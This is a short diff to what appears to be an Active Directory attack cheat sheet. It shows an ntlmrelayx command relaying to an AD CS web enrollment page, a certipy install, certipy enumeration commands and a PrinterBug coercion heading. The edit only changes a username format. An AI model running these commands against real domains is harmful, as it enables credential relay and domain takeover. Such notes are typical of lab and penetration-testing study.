@@ -15,7 +15,7 @@ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2su
 pip install certipy-ad
 
 # Prerequisites Check
-certipy find -u 'DOMAIN\user' -p 'Pass123!' -dc-ip DC_IP -target domain.local
+certipy find -u 'username@domain' -p 'Pass123!' -dc-ip DC_IP -target domain.local
 certipy find -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
 
 # 1. PrinterBug
